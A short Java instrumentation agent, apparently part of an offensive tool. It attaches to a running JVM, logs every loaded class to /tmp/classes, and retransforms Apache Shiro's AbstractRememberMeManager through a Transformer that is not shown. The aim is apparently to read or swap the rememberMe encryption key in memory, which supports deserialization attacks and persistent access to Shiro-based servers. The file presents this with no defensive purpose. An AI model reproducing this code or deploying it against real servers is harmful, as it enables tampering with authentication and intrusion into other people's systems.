package net.shiroha.agent;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.util.Base64;

public class shiroKey {
    public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException {
        Class[] classes = inst.getAllLoadedClasses();
        final String shiroClassName = "org.apache.shiro.mgt.AbstractRememberMeManager";
        try {
            FileOutputStream fout = new FileOutputStream(new File("/tmp/classes"));
            for (Class aClass : classes) {
                String msg = "ClassName: " + aClass.getName() + "\t\t\t\t" + "modify: " + (inst.isModifiableClass(aClass) ? "true": "false");
                msg += "\n\n\n\n\n";
                fout.write(msg.getBytes());
                if (aClass.getName().equals(shiroClassName)) {
                    fout.write("yesyeyseyeysyesyeysyesyesyeyseysyesyesyeyseys".getBytes());
                    inst.addTransformer(new Transformer(), true);
                    inst.retransformClasses(aClass);
                    fout.write("gotgotgotgotgot\n\n\n\n".getBytes());
                }
            }

            fout.close();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {

        }
//        inst.addTransformer(new Transformer(), true);

//        inst.retransformClasses(Class.forName(shiroClassName));
    }
}
